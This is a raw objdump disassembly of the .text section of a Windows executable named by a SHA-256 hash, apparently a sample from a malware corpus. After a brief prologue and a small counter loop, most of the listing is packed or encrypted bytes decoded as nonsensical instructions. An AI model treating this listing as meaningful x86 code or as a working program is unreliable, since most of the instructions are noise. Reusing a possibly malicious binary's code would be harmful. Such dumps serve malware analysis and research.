
9926b9c3d91a4075602d7106d27603daeccb83f9af171000115b6d5f086dd1c6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0x2e9e2408,cl
  401025:	mov    ch,0x7e
  401027:	jle    0x4010a7
  401029:	jle    0x40109a
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    edx,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    ah,bl
  40103c:	add    BYTE PTR [edi],cl
  40103e:	xor    ecx,DWORD PTR [edi]
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0x6281b5a4
  4010d8:	aad    0x47
  4010da:	jmp    0xe66a:0xcd6b78d2
  4010e1:	jmp    0xe3ed:0xd831f6c9
  4010e8:	cwde   
  4010e9:	jne    0x4010fd
  4010eb:	ret    0x6352
  4010ee:	jmp    0x43f63bad
  4010f3:	cmp    BYTE PTR [edi+0x5e5ddcf],bh
  4010f9:	in     eax,dx
  4010fa:	sub    DWORD PTR [esi],edx
  4010fc:	test   al,0xbb
  4010fe:	mov    bh,0x19
  401100:	xchg   DWORD PTR [esi+0x3],esi
  401103:	(bad)  
  401104:	imul   DWORD PTR ds:[ecx]
  401107:	jmp    0x46b6761e
  40110c:	and    eax,0x388360d5
  401111:	arpl   dx,bx
  401113:	sar    DWORD PTR [ebp+0x2e],cl
  401116:	scas   al,BYTE PTR es:[edi]
  401117:	hlt    
  401118:	fsub   QWORD PTR [ebp-0x35]
  40111b:	jbe    0x401155
  40111d:	test   al,0x1e
  40111f:	aas    
  401120:	cld    
  401121:	fidiv  DWORD PTR ds:0xc9324923
  401127:	push   eax
  401128:	mov    eax,ds:0x93e16a79
  40112d:	cmp    eax,0xa2888622
  401132:	mov    al,ds:0xd0472657
  401137:	(bad)  
  401138:	dec    ebp
  401139:	(bad)  
  40113b:	adc    eax,0xc9d55488
  401140:	fdiv   QWORD PTR [ebp+0x47]
  401143:	mov    BYTE PTR [esi+0x1b],dh
  401146:	in     al,dx
  401147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401148:	xchg   BYTE PTR [ebx],ch
  40114a:	pop    ebx
  40114b:	js     0x4011bc
  40114d:	jne    0x4011c5
  40114f:	push   0xffffffae
  401151:	adc    BYTE PTR [ebx],cl
  401153:	pop    ecx
  401154:	jno    0x4010d8
  401156:	cdq    
  401157:	dec    edi
  401158:	adc    BYTE PTR ds:0x9f40d30b,0x4e
  40115f:	push   cs
  401160:	(bad)  
  401161:	hlt    
  401162:	aad    0x6e
  401164:	pop    ds
  401165:	repnz or BYTE PTR [ecx+0x19],dh
  401169:	gs loope 0x401170
  40116c:	call   DWORD PTR [edi+0x42]
  40116f:	scas   eax,DWORD PTR es:[edi]
  401170:	loopne 0x4011bc
  401172:	into   
  401173:	mov    eax,ebp
  401175:	dec    ecx
  401176:	leave  
  401177:	push   ss
  401178:	gs push ebp
  40117a:	(bad)  
  40117b:	cmp    DWORD PTR [edx+eax*2],ecx
  40117e:	fiadd  WORD PTR [esp+ebx*2+0x16]
  401182:	(bad)  
  401183:	jle    0x4011bf
  401185:	jl     0x4011c0
  401187:	lahf   
  401188:	push   0xffffff89
  40118a:	fs or  eax,0xe959b7c0
  401190:	and    esi,DWORD PTR ds:0xcb170dd2
  401196:	inc    edx
  401197:	stos   BYTE PTR es:[edi],al
  401198:	pop    ebp
  401199:	pop    esp
  40119a:	cmp    al,0x51
  40119c:	jae    0x401176
  40119e:	mov    bh,0xe7
  4011a0:	mov    edx,0xe420ba1b
  4011a5:	ret    0x867a
  4011a8:	mov    ch,0x87
  4011aa:	retf   
  4011ab:	or     esi,edx
  4011ad:	jecxz  0x4011e9
  4011af:	bound  edi,QWORD PTR [edx+edx*4]
  4011b2:	out    dx,eax
  4011b3:	test   edi,eax
  4011b5:	sbb    eax,ebx
  4011b7:	push   cs
  4011b8:	or     ebx,0x1d
  4011bb:	dec    esi
  4011bc:	push   ss
  4011bd:	retf   
  4011be:	fwait
  4011bf:	imul   ecx,DWORD PTR [ecx-0x37],0xebdc9d99
  4011c6:	sahf   
  4011c7:	ss aad 0x1f
  4011ca:	and    ebp,DWORD PTR [ebx+0x1b]
  4011cd:	scas   al,BYTE PTR es:[edi]
  4011ce:	mov    bh,0x9c
  4011d0:	adc    al,0x11
  4011d2:	mov    edi,0xe57b7872
  4011d7:	sahf   
  4011d8:	pop    ss
  4011d9:	bswap  ebx
  4011db:	retf   
  4011dc:	inc    eax
  4011dd:	mov    esp,0x22c1c776
  4011e2:	jne    0x4011d4
  4011e4:	jno    0x4011a2
  4011e6:	enter  0xf10f,0x1d
  4011ea:	adc    al,0x2d
  4011ec:	push   edi
  4011ed:	xor    cl,BYTE PTR [edx-0x53b5c95b]
  4011f3:	xchg   edi,eax
  4011f4:	stos   DWORD PTR es:[edi],eax
  4011f5:	inc    eax
  4011f6:	mov    DWORD PTR [ebp-0x42],ebp
  4011f9:	xlat   BYTE PTR ds:[ebx]
  4011fa:	mov    ch,0x4f
  4011fc:	jb     0x401189
  4011fe:	sub    bh,BYTE PTR [ecx+ebx*1+0xd]
  401202:	fsub   QWORD PTR [edx+0x30]
  401205:	(bad)  
  401206:	cdq    
  401207:	cmc    
  401208:	adc    al,0x3a
  40120a:	jp     0x40122d
  40120c:	sub    DWORD PTR [edi+0x0],esi
  40120f:	fdivr  st(2),st
  401211:	jecxz  0x401231
  401213:	(bad)  
  401214:	sbb    BYTE PTR [edi-0x9],dl
  401217:	ficomp WORD PTR [ebp+0xc0e050e]
  40121d:	ja     0x4011b6
  40121f:	sbb    bh,cl
  401221:	ds ins DWORD PTR es:[edi],dx
  401223:	sbb    eax,0xae48bacc
  401228:	aaa    
  401229:	(bad)  
  40122a:	cli    
  40122b:	mov    eax,ds:0x5b00fdfc
  401230:	dec    edi
  401231:	inc    edx
  401232:	sti    
  401233:	sub    al,BYTE PTR [edx+eax*2+0x75]
  401237:	xor    eax,0x6640e615
  40123c:	cli    
  40123d:	jb     0x4011ee
  40123f:	push   es
  401240:	jo     0x40125b
  401242:	(bad)  
  401244:	adc    bl,BYTE PTR [edi-0x63]
  401247:	cdq    
  401248:	push   cs
  401249:	mov    eax,ds:0x60e4aeb7
  40124e:	(bad)  
  40124f:	out    dx,al
  401250:	icebp  
  401251:	and    DWORD PTR [ebx-0x6],ebx
  401254:	adc    BYTE PTR [edx+edx*4-0x4008c01e],ch
  40125b:	js     0x401279
  40125d:	pushf  
  40125e:	fimul  DWORD PTR [eax+0x4d]
  401261:	add    DWORD PTR ds:0xb08d7c90,ebx
  401267:	(bad)  
  401268:	xchg   esi,eax
  401269:	(bad)  
  40126a:	scas   eax,DWORD PTR es:[edi]
  40126b:	daa    
  40126c:	fld    QWORD PTR ss:[ebx+0x771961e1]
  401273:	hlt    
  401274:	inc    ecx
  401275:	sahf   
  401276:	enter  0x98d3,0x92
  40127a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40127b:	mov    bl,0xc5
  40127d:	mov    eax,ds:0x7ebbf2e9
  401282:	shr    DWORD PTR [esi],1
  401284:	mov    cl,dh
  401286:	fmul   DWORD PTR [edi]
  401288:	call   0xba8d18da
  40128d:	adc    al,0x1e
  40128f:	ds stos DWORD PTR es:[edi],eax
  401291:	imul   esi,DWORD PTR [edi+0x57],0x37
  401295:	cld    
  401296:	mov    ds:0x3c57db43,eax
  40129b:	xchg   ebx,eax
  40129c:	jno    0x401244
  40129e:	(bad)  
  40129f:	addr16 hlt 
  4012a1:	dec    esp
  4012a2:	cs cli 
  4012a4:	stos   DWORD PTR es:[edi],eax
  4012a5:	das    
  4012a6:	cld    
  4012a7:	push   esp
  4012a8:	shr    DWORD PTR [edx+edi*8-0x30],1
  4012ac:	in     eax,dx
  4012ad:	enter  0x3ad6,0xe1
  4012b1:	nop
  4012b2:	push   edx
  4012b3:	xchg   bl,al
  4012b5:	stc    
  4012b6:	stc    
  4012b7:	in     al,0x25
  4012b9:	aas    
  4012ba:	sub    eax,edx
  4012bc:	ret    
  4012bd:	repz clc 
  4012bf:	cld    
  4012c0:	ficom  WORD PTR [edx]
  4012c2:	sub    eax,0x28c5e8f9
  4012c7:	pop    ds
  4012c8:	fidivr DWORD PTR [eax+0x49684371]
  4012ce:	into   
  4012cf:	xchg   esi,eax
  4012d0:	mov    es,esp
  4012d2:	adc    dl,cl
  4012d4:	out    0xaf,al
  4012d6:	or     eax,DWORD PTR [eax+0x382b80e3]
  4012dc:	jb     0x4012de
  4012de:	idiv   eax
  4012e0:	xchg   ch,ah
  4012e2:	das    
  4012e3:	cdq    
  4012e4:	sub    ah,BYTE PTR [edx+0x61]
  4012e7:	mov    al,0xa4
  4012e9:	scas   eax,DWORD PTR es:[edi]
  4012ea:	pushf  
  4012eb:	bound  ecx,QWORD PTR [ebp+0x67]
  4012ee:	sub    al,0xa9
  4012f0:	test   al,0xf6
  4012f2:	add    eax,0xda32c3c3
  4012f7:	(bad)  
  4012f9:	(bad)  
  4012fa:	int    0x3b
  4012fc:	adc    al,0xcc
  4012fe:	mov    esp,0xd9c5bcc3
  401303:	sub    dh,BYTE PTR [eax+ecx*2]
  401306:	mov    ch,0xc6
  401308:	in     al,dx
  401309:	add    eax,0x81905e9d
  40130e:	mov    dl,0xf0
  401310:	aad    0x3d
  401312:	rcr    DWORD PTR [eax+0x6c1dc975],0x14
  401319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40131a:	repnz sbb ah,BYTE PTR [esp]
  40131e:	cmp    edi,DWORD PTR [ebp-0x3acdbb89]
  401324:	sar    DWORD PTR [ebp+0x38],1
  401327:	mul    DWORD PTR [edi]
  401329:	jge    0x4012b0
  40132b:	pusha  
  40132c:	mov    DWORD PTR [ebx],eax
  40132e:	or     DWORD PTR [ecx+0x64],ecx
  401331:	jbe    0x401326
  401333:	test   ebx,edi
  401335:	jno    0x4012e9
  401337:	and    DWORD PTR [eax],esi
  401339:	jmp    DWORD PTR [edx+0x36]
  40133c:	mov    ecx,0x9164e6f0
  401341:	push   0xffffff8d
  401343:	jno    0x4012e4
  401345:	inc    edx
  401346:	call   0x4afb:0x6b1d35b3
  40134d:	dec    edx
  40134e:	push   ebx
  40134f:	inc    edx
  401350:	mov    ebx,0x539e9a4f
  401355:	push   cs
  401356:	jmp    0xc4a97b60
  40135b:	pop    ss
  40135c:	repnz fmul DWORD PTR [esp+ebx*2-0x77457207]
  401364:	cwde   
  401365:	xor    esp,ebx
  401367:	lods   al,BYTE PTR ds:[esi]
  401368:	pushf  
  401369:	pop    ecx
  40136a:	in     eax,dx
  40136b:	pop    esp
  40136c:	retf   0x1c53
  40136f:	mov    esp,0x9199ab8
  401374:	into   
  401375:	int    0x30
  401377:	dec    esp
  401378:	mov    edi,0x414b8ec4
  40137d:	dec    ebx
  40137e:	push   0x66
  401380:	pop    ebx
  401381:	lods   eax,DWORD PTR ds:[esi]
  401382:	scas   al,BYTE PTR es:[edi]
  401383:	in     al,dx
  401384:	ss popa 
  401386:	jle    0x401370
  401388:	sbb    cl,BYTE PTR [ebp-0x5f168f46]
  40138e:	sti    
  40138f:	(bad)  
  401390:	js     0x40136b
  401392:	mov    BYTE PTR [eax-0x30dc1889],dh
  401398:	rcl    DWORD PTR [ebx+0x3],cl
  40139b:	jns    0x4013a4
  40139d:	jb     0x40139b
  40139f:	and    DWORD PTR [ebx+ecx*2+0x32],ebp
  4013a3:	dec    ebx
  4013a4:	sbb    eax,0x3c789b04
  4013a9:	into   
  4013aa:	ins    DWORD PTR es:[edi],dx
  4013ab:	dec    esp
  4013ac:	imul   ebx,DWORD PTR [ebx-0x6a4ceeda],0xfffffff1
  4013b3:	adc    esi,ebp
  4013b5:	loopne 0x4013c8
  4013b7:	pop    es
  4013b8:	mul    DWORD PTR [eax]
  4013ba:	fs push es
  4013bc:	(bad)  [ecx+ebx*4+0x31a88272]
  4013c3:	lods   al,BYTE PTR ds:[esi]
  4013c4:	pop    ebx
  4013c5:	daa    
  4013c6:	or     bl,BYTE PTR ds:[eax+0x6b]
  4013ca:	into   
  4013cb:	xchg   ecx,eax
  4013cc:	or     BYTE PTR [ebp+0x4e4ce21f],bl
  4013d2:	leave  
  4013d3:	sub    DWORD PTR [edi],esi
  4013d5:	rcl    dl,0xbd
  4013d8:	popf   
  4013d9:	cmp    eax,0x4bdf92af
  4013de:	shr    BYTE PTR [ebx+ebp*2-0x9d654aa],cl
  4013e5:	mov    edi,0xb5c48828
  4013ea:	outs   dx,BYTE PTR ds:[esi]
  4013eb:	aam    0x1b
  4013ed:	sbb    ebp,DWORD PTR [edx]
  4013ef:	mov    edx,0x213851f2
  4013f4:	lds    edx,FWORD PTR [ecx]
  4013f6:	(bad)  
  4013f7:	push   esi
  4013f8:	pop    edx
  4013f9:	out    dx,eax
  4013fa:	call   0xa0ee56f4
  4013ff:	lods   eax,DWORD PTR ds:[esi]
  401400:	jecxz  0x401467
  401402:	or     DWORD PTR [ebp-0x19737bb],ebp
  401408:	shl    ah,1
  40140a:	mov    cl,0x12
  40140c:	dec    BYTE PTR [ebx-0x29ddc728]
  401412:	lahf   
  401413:	in     eax,dx
  401414:	xchg   esp,eax
  401415:	mov    edi,0xbe08cbbb
  40141a:	stos   BYTE PTR es:[edi],al
  40141b:	jg     0x401424
  40141d:	and    DWORD PTR [edx-0x5f],0xffffffee
  401421:	cmp    al,0x41
  401423:	add    BYTE PTR [ecx+0x45c7b845],cl
  401429:	lock xor DWORD PTR [ebp+0x1315f89c],eax
  401430:	pusha  
  401431:	add    BYTE PTR [eax],al
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43374b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433773,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4337eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4337f3
  401461:	sbb    DWORD PTR ds:0x4337ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433843,0x1c
  401476:	cmp    DWORD PTR ds:0x433843,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433843,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433843
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433843,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    eax,DWORD PTR [eax+0x6f755ba3]
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x40147f
  4014ce:	mov    ebx,0x7faa4648
  4014d3:	xor    eax,0xf417c985
  4014d8:	rcl    DWORD PTR [eax],cl
  4014da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014db:	addr16 sbb cl,dh
  4014de:	repz or DWORD PTR [ebp+0x47],0xb685f679
  4014e6:	jp     0x40153b
  4014e8:	pop    ebp
  4014e9:	std    
  4014ea:	rcl    esp,0xd5
  4014ed:	ds and al,0x32
  4014f0:	shr    DWORD PTR ds:0x866cd24a,cl
  4014f6:	dec    edx
  4014f7:	mov    ch,0x19
  4014f9:	scas   al,BYTE PTR es:[edi]
  4014fa:	jns    0x40149a
  4014fc:	mov    bl,0x57
  4014fe:	(bad)
  401501:	xor    BYTE PTR ds:0xca16ea50,dl
  401507:	in     eax,0xf6
  401509:	ror    DWORD PTR [ecx+esi*2+0x7c82a1f9],1
  401510:	fild   WORD PTR [esi-0x48b22dea]
  401516:	mov    ebp,0x9ac2947
  40151b:	sbb    eax,0x127d754a
  401520:	ins    BYTE PTR es:[edi],dx
  401521:	(bad)  
  401522:	sbb    al,0x9b
  401524:	or     eax,DWORD PTR [edi+0x5e]
  401527:	test   BYTE PTR [esi+0x40],0x5b
  40152b:	jge    0x401575
  40152d:	fwait
  40152e:	xchg   esp,eax
  40152f:	or     eax,0xd2716d27
  401534:	or     ah,cl
  401536:	xchg   ecx,eax
  401537:	in     al,dx
  401538:	push   ds
  401539:	retf   0xc696
  40153c:	inc    eax
  40153d:	sbb    al,0x9c
  40153f:	mov    esp,0xaf50d0ad
  401544:	xchg   esp,eax
  401545:	push   ecx
  401546:	mov    ebx,DWORD PTR [ebx+ebp*2+0x17]
  40154a:	call   0xe273:0x2da121d0
  401551:	popf   
  401552:	cdq    
  401553:	dec    ecx
  401554:	xor    ch,BYTE PTR [ecx-0x30]
  401557:	jg     0x4014ec
  401559:	and    eax,0x7b79bafb
  40155e:	mov    edi,0x87c2db6
  401563:	sub    bl,BYTE PTR [edx-0x7662f305]
  401569:	out    dx,al
  40156a:	std    
  40156b:	pop    ss
  40156c:	mov    esi,esp
  40156e:	out    0x2,eax
  401570:	sbb    eax,0xd412929e
  401575:	inc    ebp
  401576:	clc    
  401577:	into   
  401578:	test   DWORD PTR [ebx-0x53cdc389],ebp
  40157e:	dec    edi
  40157f:	add    eax,0xc866f60e
  401584:	(bad)  
  401585:	jne    0x40155b
  401587:	sti    
  401588:	add    BYTE PTR [eax+eiz*4],bl
  40158b:	arpl   bp,ax
  40158d:	jb     0x401521
  40158f:	pop    es
  401590:	mov    dh,0x34
  401592:	mov    al,ds:0x95fb20f7
  401597:	iret   
  401598:	dec    edx
  401599:	stos   BYTE PTR es:[edi],al
  40159a:	retf   
  40159b:	push   esp
  40159c:	ins    DWORD PTR es:[edi],dx
  40159d:	popf   
  40159e:	adc    DWORD PTR [edx-0x74],edi
  4015a1:	out    dx,eax
  4015a2:	mov    dh,0x9
  4015a4:	sbb    ebp,ecx
  4015a6:	mov    bh,0x76
  4015a8:	popa   
  4015a9:	call   0x84e98b47
  4015ae:	test   eax,0x39b987eb
  4015b3:	ja     0x4015b7
  4015b5:	pusha  
  4015b6:	and    eax,0xffffff9d
  4015b9:	dec    edx
  4015ba:	xchg   esp,eax
  4015bb:	mov    ds:0x40566d39,eax
  4015c0:	mov    edx,0xfdce9dbc
  4015c5:	xchg   esi,eax
  4015c6:	ret    0x320
  4015c9:	in     al,0x8a
  4015cb:	jmp    0x40159d
  4015cd:	in     al,dx
  4015ce:	cs fwait
  4015d0:	jmp    0xcb3c:0x13b76237
  4015d7:	xor    BYTE PTR [edi+0x30a1bce4],bh
  4015dd:	add    BYTE PTR [esi],0x65
  4015e0:	pushf  
  4015e1:	or     ah,BYTE PTR [ebx]
  4015e3:	jmp    0x401637
  4015e5:	sub    dl,bl
  4015e7:	push   ss
  4015e8:	inc    esi
  4015e9:	push   esi
  4015ea:	lock dec ebp
  4015ec:	jbe    0x401581
  4015ee:	call   0x55d7:0x7c640f3f
  4015f5:	cdq    
  4015f6:	adc    edx,esp
  4015f8:	(bad)  [esi+0x2e338261]
  4015fe:	div    BYTE PTR [ebp+0x73]
  401601:	ins    BYTE PTR es:[edi],dx
  401602:	push   ds
  401603:	and    ah,BYTE PTR [ecx]
  401605:	dec    edx
  401606:	jmp    0x617f16a7
  40160b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40160c:	xchg   edx,eax
  40160d:	xchg   ebx,eax
  40160e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40160f:	add    dh,BYTE PTR [edx]
  401611:	sub    esp,DWORD PTR [ebp+0x7cc8392e]
  401617:	pushf  
  401618:	jge    0x4015b5
  40161a:	add    edx,DWORD PTR [esi-0x4eb49195]
  401620:	adc    al,0x0
  401622:	je     0x40164c
  401624:	test   BYTE PTR [ecx+edx*8+0x28c55d9f],bl
  40162b:	mov    cl,0x2d
  40162d:	adc    eax,0x82461767
  401632:	sub    DWORD PTR [eax-0x6],edx
  401635:	rol    bl,0x3
  401638:	aad    0x9e
  40163a:	pop    ecx
  40163b:	pusha  
  40163c:	mov    edx,DWORD PTR [edi-0x73]
  40163f:	jnp    0x40163b
  401641:	stos   BYTE PTR es:[edi],al
  401642:	xchg   edi,eax
  401643:	sbb    BYTE PTR [edx+ebp*8+0x5444ca06],cl
  40164a:	in     eax,dx
  40164b:	push   eax
  40164c:	mov    ch,0x39
  40164e:	shl    esp,1
  401650:	in     eax,dx
  401651:	inc    ecx
  401652:	mov    ecx,0x4a12d49a
  401657:	mov    WORD PTR [edx],es
  401659:	pop    eax
  40165a:	neg    BYTE PTR [ebp-0x4c]
  40165d:	jno    0x401621
  40165f:	or     al,0x60
  401661:	mov    bl,0x2b
  401663:	pop    esp
  401664:	xor    eax,0xe436c29c
  401669:	dec    ebx
  40166a:	jbe    0x4016d7
  40166c:	dec    edx
  40166d:	imul   edi,DWORD PTR [esi+edx*4-0x79867354],0xffffff90
  401675:	imul   BYTE PTR ds:0xbe841193
  40167b:	inc    eax
  40167c:	shl    BYTE PTR [ebx-0x4c66a900],0x9e
  401683:	hlt    
  401684:	ja     0x40160f
  401686:	adc    BYTE PTR [esi+0x540cd400],ah
  40168c:	inc    edi
  40168d:	sahf   
  40168e:	jmp    0x6daa:0x976d4f11
  401695:	je     0x4016e1
  401697:	adc    BYTE PTR ds:0x260ae38c,0x9
  40169e:	cs das 
  4016a0:	xor    al,0x33
  4016a2:	popa   
  4016a3:	rcr    DWORD PTR [ebx-0x1e],0x90
  4016a7:	ficomp WORD PTR [edi]
  4016a9:	jp     0x4016e7
  4016ab:	jge    0x4016f6
  4016ad:	in     al,0xa3
  4016af:	xchg   ecx,ecx
  4016b1:	pop    eax
  4016b2:	cmp    BYTE PTR [edx+edi*1],bl
  4016b5:	push   ss
  4016b6:	xor    ah,BYTE PTR [eax+0x52]
  4016b9:	int    0xb4
  4016bb:	aaa    
  4016bc:	pop    eax
  4016bd:	mov    dl,0xb
  4016bf:	jns    0x4016e4
  4016c1:	fiadd  DWORD PTR [edx+edi*2+0x3b]
  4016c5:	push   es
  4016c6:	in     al,dx
  4016c7:	stos   DWORD PTR es:[edi],eax
  4016c8:	(bad)  
  4016c9:	sub    DWORD PTR [edx+ebx*4-0x3b],ecx
  4016cd:	mov    cl,BYTE PTR ds:0x6dac9a9f
  4016d3:	xchg   esp,eax
  4016d4:	mov    ecx,0x25abfb70
  4016d9:	cli    
  4016da:	(bad)  
  4016db:	hlt    
  4016dc:	add    DWORD PTR [edx-0x6415a01f],0xffffff86
  4016e3:	retf   
  4016e4:	dec    edx
  4016e5:	stc    
  4016e6:	mov    dh,0x84
  4016e8:	lea    ecx,[edx]
  4016ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016eb:	or     DWORD PTR [ebp-0x69ca0b43],esi
  4016f1:	add    BYTE PTR [edi-0x9baa327],dh
  4016f7:	sbb    al,dh
  4016f9:	jns    0x401773
  4016fb:	(bad)  
  4016fd:	mov    cl,0xb3
  4016ff:	stc    
  401700:	mov    edi,esp
  401702:	or     BYTE PTR [ecx],dh
  401704:	jge    0x401759
  401706:	and    dh,dh
  401708:	push   edx
  401709:	cmp    eax,0xd75bd011
  40170e:	or     edx,DWORD PTR [ecx]
  401710:	sub    eax,0x7b11aacd
  401715:	xchg   esp,eax
  401716:	pop    ebp
  401717:	and    dh,BYTE PTR [eax]
  401719:	mov    es,WORD PTR [ebp-0x4674cfb]
  40171f:	fs retf 0x5942
  401723:	out    dx,al
  401724:	dec    ebp
  401725:	pop    ecx
  401726:	sbb    bh,BYTE PTR [esi-0x46]
  401729:	ins    BYTE PTR es:[edi],dx
  40172a:	outs   dx,BYTE PTR ds:[esi]
  40172b:	mov    edi,0xc82045d1
  401730:	std    
  401731:	jne    0x4016cf
  401733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401734:	test   DWORD PTR [ebp-0x5d668836],ebp
  40173a:	mov    WORD PTR [edx],cs
  40173c:	test   DWORD PTR [eax-0x6c],edx
  40173f:	ins    DWORD PTR es:[edi],dx
  401740:	push   ds
  401741:	push   ss
  401742:	dec    esp
  401743:	jg     0x4017b8
  401745:	add    bh,al
  401747:	stos   BYTE PTR es:[edi],al
  401748:	cmp    al,BYTE PTR [esi+eiz*4]
  40174b:	inc    edi
  40174c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40174d:	cmp    eax,edx
  40174f:	in     eax,0xcb
  401751:	mov    dh,0x5d
  401753:	in     al,dx
  401754:	or     esi,DWORD PTR [eax]
  401756:	retf   0xf3c7
  401759:	ror    DWORD PTR [edi+0x42],cl
  40175c:	repz mov eax,ds:0x2d306335
  401762:	and    DWORD PTR [esi-0x11653c47],0x35
  401769:	loopne 0x401704
  40176b:	sbb    edx,ecx
  40176d:	call   0x77c5dca0
  401772:	daa    
  401773:	add    cl,BYTE PTR [esi-0x4d04b7a3]
  401779:	(bad)  
  40177b:	cmp    BYTE PTR [eax+0x4],cl
  40177e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40177f:	jae    0x4017d4
  401781:	jnp    0x401750
  401783:	push   ss
  401784:	sbb    eax,0x3eb3280e
  401789:	xor    al,0xae
  40178b:	xchg   ebp,eax
  40178c:	ror    DWORD PTR gs:[ecx+0x46],1
  401790:	dec    edi
  401791:	and    al,0xc2
  401793:	sbb    al,0x89
  401795:	and    BYTE PTR ds:0x748c6627,ah
  40179b:	mov    ch,0x75
  40179d:	dec    BYTE PTR [eax+edx*8-0x70]
  4017a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017a2:	xlat   BYTE PTR ds:[ebx]
  4017a3:	jnp    0x401795
  4017a5:	dec    ecx
  4017a6:	lds    esi,FWORD PTR [esi-0x56bcc80c]
  4017ac:	xchg   ebp,eax
  4017ad:	stos   BYTE PTR es:[edi],al
  4017ae:	and    eax,0xcbd1a1d5
  4017b3:	mov    ds:0x84e4c4ee,eax
  4017b8:	inc    ebx
  4017b9:	and    eax,0x229c9c50
  4017be:	iret   
  4017bf:	push   cs
  4017c0:	sbb    cl,BYTE PTR [edi+edi*4]
  4017c3:	hlt    
  4017c4:	ds das 
  4017c6:	cmp    DWORD PTR [eax+0x57],eax
  4017c9:	xchg   esi,eax
  4017ca:	sbb    WORD PTR [ebp-0x69],0xa23
  4017d0:	and    BYTE PTR [edx],0xf7
  4017d3:	rol    ch,0x63
  4017d6:	iret   
  4017d7:	(bad)  
  4017d8:	shl    BYTE PTR [eax],cl
  4017da:	(bad)  [edx+0x60747b91]
  4017e0:	(bad)  
  4017e1:	jmp    FWORD PTR [edx+0x37]
  4017e4:	xor    ecx,edx
  4017e6:	cmp    al,0xc5
  4017e8:	rcl    DWORD PTR [edx-0xb],0xc
  4017ec:	fs push cs
  4017ee:	lods   eax,DWORD PTR ds:[esi]
  4017ef:	repnz pop eax
  4017f1:	scas   al,BYTE PTR es:[edi]
  4017f2:	and    eax,0xb1edc936
  4017f7:	jmp    0x401877
  4017f9:	mov    cl,0x2e
